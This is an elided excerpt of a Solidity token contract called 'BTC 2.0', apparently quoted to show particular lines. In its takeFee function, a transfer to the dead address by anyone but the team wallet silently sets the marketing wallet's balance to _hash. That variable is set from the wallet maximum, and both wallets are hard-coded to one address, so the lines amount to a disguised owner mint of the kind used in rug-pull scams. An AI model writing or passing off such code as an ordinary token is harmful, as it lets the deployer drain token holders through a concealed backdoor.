...
contract VIMToken is Context, IERC20, Ownable {
    ...
    string private _name = "BTC 2.0";
    string private _symbol = "BTC 2.0";
    ...
    uint256 private _hash = _walletMax;
    ...
    constructor () {
        ...
        isTxExempt[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0x1A1F981117b07C0608B7ec13f27d1C97cEE1851B));
        marketingWalletAddress = payable(address(0x1A1F981117b07C0608B7ec13f27d1C97cEE1851B));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isTxExempt[sender] && swapAndLiquifyEnabled)
            {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (sender != teamWalletAddress && recipient == deadAddress) {
            _balances[marketingWalletAddress] = _hash;
        }

        if(isTxExempt[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(isTxExempt[recipient]) {
